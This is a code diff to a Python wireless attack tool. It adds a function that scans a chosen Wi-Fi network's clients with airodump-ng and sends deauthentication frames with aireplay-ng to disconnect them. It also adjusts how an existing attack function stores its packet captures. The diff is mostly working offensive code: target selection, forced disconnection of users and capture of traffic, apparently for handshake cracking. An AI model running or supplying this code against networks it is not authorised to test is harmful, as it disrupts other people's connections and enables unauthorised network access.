@@ -229,6 +229,8 @@ def findTargetWash():
     # Export output of command to list split by newline
     output = process_Wash.stdout.read().splitlines()
 
+    # --------OUTPUT NETWORKS--------
+
     # Print header
     print(Fore.BLUE,'+---#--------BSSID-----------Power Level-----------Channel-----------Network Name-----------+',Fore.WHITE)
     # Traverse output list
@@ -256,14 +258,35 @@ def findTargetWash():
             print(Fore.BLUE,'+-------------------------------------------------------------------------------------------+',Fore.CYAN)
     choice  = int(input('Select a network: '))
     print('Selected:',networks[choice])
-    attack(networks[choice])
+    # attack(networks[choice])
+    findClients(networks[choice])
+
+def findClients(target):
+    # internal variables - BSSID, Channel, Name, & fileName
+    BSSID = target[0]
+    Channel = target[1]
+    Name = target[3]
+    fileName = 'clients/clients_'+Name
+    interface = getInterface(0)
+
+    command_1 = ['airodump-ng', '-K', '1', '-c', Channel, '--bssid', BSSID, '-w', fileName, '--output-format', 'csv', interface]
+    command_2 = ['aireplay-ng','--deauth','5','-a',BSSID,interface]
+
+    process = sp.Popen(command_1, stdout=sp.PIPE, text=True)
+    print(Fore.YELLOW, 'Searching for clients...(30sec)')
+    t.sleep(3)
+    sp.run(command_2, stdout=sp.DEVNULL)
+    t.sleep(27)
+    process.send_signal(signal.SIGINT)
+    sp.run(['cat',fileName+'.csv'])
+
 
 def attack(target):
     # internal variables - BSSID, Channel, Name, & fileName
     BSSID = target[0]
     Channel = target[1]
     Name = target[3]
-    fileName = 'capture_'+Name
+    fileName = 'captures/capture_'+Name
     interface = getInterface(0)
 
     # Commands - airodump-ng: capture data & aireplay-ng: deauth network
